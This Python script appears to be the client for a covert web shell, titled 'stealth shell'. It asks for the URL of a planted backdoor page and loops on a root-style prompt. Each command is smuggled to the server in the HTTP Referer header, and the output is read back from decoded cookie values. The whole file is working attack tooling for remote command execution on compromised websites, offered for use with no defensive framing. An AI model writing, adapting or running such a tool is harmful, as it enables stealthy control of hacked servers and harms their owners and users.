import requests
from urllib.parse import unquote
from urllib.parse import urlparse

print('''                                 
                    ,--,,-.----.    
  ,----..         ,--.'|\    /  \   
 /   /   \     ,--,  | :|   :    \  
|   :     : ,---.'|  : '|   |  .\ : 
.   |  ;. / |   | : _' |.   :  |: | 
.   ; /--`  :   : |.'  ||   |   \ : 
;   | ;  __ |   ' '  ; :|   : .   / 
|   : |.' .''   |  .'. |;   | |`-'  
.   | '_.' :|   | :  | '|   | ;     
'   ; : \  |'   : |  : ;:   ' |     
'   | '/  .'|   | '  ,/ :   : :     
|   :    /  ;   : ;--'  |   | :     
 \   \ .'   |   ,/      `---'.|     
  `---`     '---'         `---`     
  
  stealth shell
''')

def main():
    print("")
    cmd = input("bloostealth@"+domain+" ~#: ")
    if cmd == "su":
        print("")
        print("Bloos3rpent > You Need to BackConnect First!")
        main()
    else :
        r=requests.get(target, headers={"Referer":cmd})
        for c in r.cookies:
            print(unquote(c.value))
        main()


target = input("Target site (http://xxxxx.com/ninja.php) > ")
parsed_uri = urlparse(target)
domain = '{uri.netloc}'.format(uri=parsed_uri)
main()
